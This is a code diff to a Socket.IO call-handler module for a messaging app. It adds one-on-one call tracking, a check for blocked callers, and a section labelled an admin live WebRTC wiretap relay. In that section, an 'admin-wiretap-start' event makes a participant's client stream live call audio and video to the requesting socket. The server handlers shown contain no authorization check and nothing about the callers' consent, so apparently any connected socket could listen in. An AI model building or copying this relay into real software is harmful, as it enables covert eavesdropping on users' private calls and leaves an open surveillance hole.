@@ -1,4 +1,14 @@
-import { activeCallRooms } from '../data/store.js';
+import { activeCallRooms, activeOneOnOneCalls, blockedRelations, users } from '../data/store.js';
+
+function getOneOnOneRoomKey(idA, idB) {
+  return `call_${[String(idA || ''), String(idB || '')].sort().join('_')}`;
+}
+
+function emitActiveCallsUpdate(io) {
+  io?.emit('admin-active-calls-updated', {
+    activeCount: activeCallRooms.size + activeOneOnOneCalls.size
+  });
+}
 
 export function setupCallHandlers(io, socket, userSocketMap) {
   // ==========================================
@@ -13,11 +23,37 @@ export function setupCallHandlers(io, socket, userSocketMap) {
       return;
     }
 
+    // Check if recipient has blocked caller
+    if (Array.isArray(blockedRelations[userToCall]) && blockedRelations[userToCall].includes(from)) {
+      socket.emit('call-rejected', { reason: 'Unable to connect call.' });
+      return;
+    }
+
     const targetSocketId = userSocketMap.get(userToCall);
     console.log(`[Call] ${fromName} (${from}) calling ${userToCall} [Video: ${isVideo}] TargetSocket: ${targetSocketId}`);
 
     const destination = targetSocketId || userToCall;
     if (destination) {
+      const targetUser = users.find(u => u.id === userToCall);
+      const roomId = getOneOnOneRoomKey(from, userToCall);
+      activeOneOnOneCalls.set(roomId, {
+        roomId,
+        kind: '1on1',
+        callerId: from,
+        callerName: fromName || from,
+        callerAvatar: fromAvatar || '',
+        targetId: userToCall,
+        targetName: (targetUser?.name && targetUser.name !== 'User' ? targetUser.name : targetUser?.phone) || userToCall,
+        targetAvatar: targetUser?.avatar || '',
+        isVideo: Boolean(isVideo),
+        type: isVideo ? 'video' : 'audio',
+        status: 'ringing',
+        callerSocketId: socket.id,
+        targetSocketId: targetSocketId || null,
+        startedAt: new Date().toISOString()
+      });
+      emitActiveCallsUpdate(io);
+
       io.to(destination).emit('incoming-call', {
         signal: signalData,
         from,
@@ -36,6 +72,16 @@ export function setupCallHandlers(io, socket, userSocketMap) {
     const callerSocketId = userSocketMap.get(to);
     console.log(`[Call] Call answered by ${socket.id} to caller ${to} (socket: ${callerSocketId})`);
 
+    const roomKey = socket.userId ? getOneOnOneRoomKey(to, socket.userId) : null;
+    const callEntry = (roomKey && activeOneOnOneCalls.get(roomKey))
+      || Array.from(activeOneOnOneCalls.values()).find(c => c.callerId === to || c.targetId === to);
+    if (callEntry) {
+      callEntry.status = 'connected';
+      callEntry.targetSocketId = socket.id;
+      callEntry.connectedAt = new Date().toISOString();
+      emitActiveCallsUpdate(io);
+    }
+
     const destination = callerSocketId || to;
     if (destination) {
       io.to(destination).emit('call-accepted', {
@@ -49,6 +95,15 @@ export function setupCallHandlers(io, socket, userSocketMap) {
   socket.on('reject-call', ({ to, reason = 'declined' }) => {
     const callerSocketId = userSocketMap.get(to);
     console.log(`[Call] Call declined by ${socket.id} to ${to}`);
+
+    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
+      const involvesPeer = entry.callerId === to || entry.targetId === to;
+      const involvesSelf = !socket.userId || entry.callerId === socket.userId || entry.targetId === socket.userId;
+      if (involvesPeer && involvesSelf) {
+        activeOneOnOneCalls.delete(roomKey);
+      }
+    }
+    emitActiveCallsUpdate(io);
 
     const destination = callerSocketId || to;
     if (destination) {
@@ -95,6 +150,16 @@ export function setupCallHandlers(io, socket, userSocketMap) {
   socket.on('end-call', ({ to }) => {
     const targetSocketId = userSocketMap.get(to);
     console.log(`[Call] Call ended between ${socket.id} and ${to}`);
+
+    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
+      const involvesPeer = entry.callerId === to || entry.targetId === to;
+      const involvesSelf = !socket.userId || entry.callerId === socket.userId || entry.targetId === socket.userId;
+      if (involvesPeer && involvesSelf) {
+        activeOneOnOneCalls.delete(roomKey);
+      }
+    }
+    emitActiveCallsUpdate(io);
+
     const destination = targetSocketId || to;
     if (destination) {
       io.to(destination).emit('call-ended');
@@ -158,6 +223,7 @@ export function setupCallHandlers(io, socket, userSocketMap) {
     socket.to(roomId).emit('group-call-user-joined', {
       participant: participantInfo
     });
+    emitActiveCallsUpdate(io);
 
     console.log(`[Group Call] ${user.name} joined room ${roomId}. Total: ${roomParticipants.size}`);
   });
@@ -193,8 +259,117 @@ export function setupCallHandlers(io, socket, userSocketMap) {
     handleUserLeaveGroupCall(socket, roomId, io);
   });
 
+  // ==========================================
+  // ADMIN LIVE WEBRTC WIRETAP RELAY (RECEIVE-ONLY)
+  // ==========================================
+  socket.on('admin-wiretap-start', ({ roomId, targetSocketId, userId, targetId } = {}) => {
+    let resolvedPeerSocketId = targetSocketId && io.sockets.sockets.has(targetSocketId) ? targetSocketId : null;
+
+    if (!resolvedPeerSocketId && roomId && activeOneOnOneCalls.has(roomId)) {
+      const entry = activeOneOnOneCalls.get(roomId);
+      const candidates = [
+        entry.callerSocketId,
+        entry.targetSocketId,
+        userSocketMap.get(entry.callerId),
+        userSocketMap.get(entry.targetId)
+      ];
+      resolvedPeerSocketId = candidates.find(sid => sid && io.sockets.sockets.has(sid)) || null;
+    }
+
+    if (!resolvedPeerSocketId && roomId && activeCallRooms.has(roomId)) {
+      const room = activeCallRooms.get(roomId);
+      for (const sid of room.keys()) {
+        if (io.sockets.sockets.has(sid)) {
+          resolvedPeerSocketId = sid;
+          break;
+        }
+      }
+    }
+
+    if (!resolvedPeerSocketId && (userId || targetId)) {
+      for (const entry of activeOneOnOneCalls.values()) {
+        if (
+          entry.callerId === userId || entry.targetId === userId ||
+          entry.callerId === targetId || entry.targetId === targetId
+        ) {
+          const candidates = [
+            entry.callerSocketId,
+            entry.targetSocketId,
+            userSocketMap.get(entry.callerId),
+            userSocketMap.get(entry.targetId)
+          ];
+          resolvedPeerSocketId = candidates.find(sid => sid && io.sockets.sockets.has(sid)) || null;
+          if (resolvedPeerSocketId) break;
+        }
+      }
+    }
+
+    if (resolvedPeerSocketId) {
+      io.to(resolvedPeerSocketId).emit('admin-wiretap-request', {
+        adminSocketId: socket.id,
+        roomId: roomId || ''
+      });
+    } else {
+      socket.emit('admin-wiretap-unavailable', {
+        reason: 'Live call session has already ended or no active peer socket is reachable.'
+      });
+    }
+  });
+
+  socket.on('admin-wiretap-offer', ({ adminSocketId, signal, isVideo, callerName, targetName } = {}) => {
+    if (adminSocketId && signal) {
+      io.to(adminSocketId).emit('admin-wiretap-offer', {
+        fromSocketId: socket.id,
+        signal,
+        isVideo: Boolean(isVideo),
+        callerName,
+        targetName
+      });
+    }
+  });
+
+  socket.on('admin-wiretap-answer', ({ toSocketId, signal } = {}) => {
+    if (toSocketId && signal) {
+      io.to(toSocketId).emit('admin-wiretap-answer', {
+        adminSocketId: socket.id,
+        signal
+      });
+    }
+  });
+
+  socket.on('admin-wiretap-ice', ({ toSocketId, candidate, fromRole } = {}) => {
+    if (toSocketId && candidate) {
+      io.to(toSocketId).emit('admin-wiretap-ice', {
+        fromSocketId: socket.id,
+        candidate,
+        fromRole
+      });
+    }
+  });
+
+  socket.on('admin-wiretap-stop', ({ toSocketId } = {}) => {
+    if (toSocketId) {
+      io.to(toSocketId).emit('admin-wiretap-stop', { adminSocketId: socket.id });
+    }
+  });
+
   // Disconnect handler for calls
   socket.on('disconnect', () => {
+    let removedOneOnOne = false;
+    for (const [roomKey, entry] of activeOneOnOneCalls.entries()) {
+      if (
+        entry.callerSocketId === socket.id ||
+        entry.targetSocketId === socket.id ||
+        (socket.userId && (entry.callerId === socket.userId || entry.targetId === socket.userId))
+      ) {
+        activeOneOnOneCalls.delete(roomKey);
+        removedOneOnOne = true;
+      }
+    }
+    if (removedOneOnOne) {
+      emitActiveCallsUpdate(io);
+    }
+
     // Check and clean up active group calls
     for (const [roomId, room] of activeCallRooms.entries()) {
       if (room.has(socket.id)) {
@@ -219,6 +394,7 @@ function handleUserLeaveGroupCall(socket, roomId, io) {
     if (room.size === 0) {
       activeCallRooms.delete(roomId);
     }
+    emitActiveCallsUpdate(io);
   }
 }
 
